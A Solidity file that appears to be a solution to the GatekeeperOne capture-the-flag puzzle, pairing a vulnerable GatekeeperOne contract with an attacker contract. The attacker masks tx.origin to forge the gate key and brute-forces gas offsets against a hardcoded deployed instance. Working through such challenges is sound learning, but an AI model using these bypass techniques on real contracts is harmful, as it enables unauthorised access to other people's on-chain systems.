// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./library/SafeMath.sol";

contract GatekeeperOneAttacker {
  GatekeeperOne public gatekeeperone = GatekeeperOne(0xFE0ddAFAf68BDD5386De1A780BA8C5B2bab7465b); // Gatekeeper Instance

  function attack(bytes8 txOrigin16) public {
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    for (uint256 i = 0; i < 120; i++) {
      (bool result, bytes memory data) = address(gatekeeperone).call{gas: i + 150 + 8191 * 3}(
        abi.encodeWithSignature("enter(bytes8)", key)
      );
      if (result) {
        break;
      }
    }
  }
}

contract GatekeeperOne {
  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(
      uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
      "GatekeeperOne: invalid gateThree part one"
    );
    require(
      uint32(uint64(_gateKey)) != uint64(_gateKey),
      "GatekeeperOne: invalid gateThree part two"
    );
    require(
      uint32(uint64(_gateKey)) == uint16(tx.origin),
      "GatekeeperOne: invalid gateThree part three"
    );
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
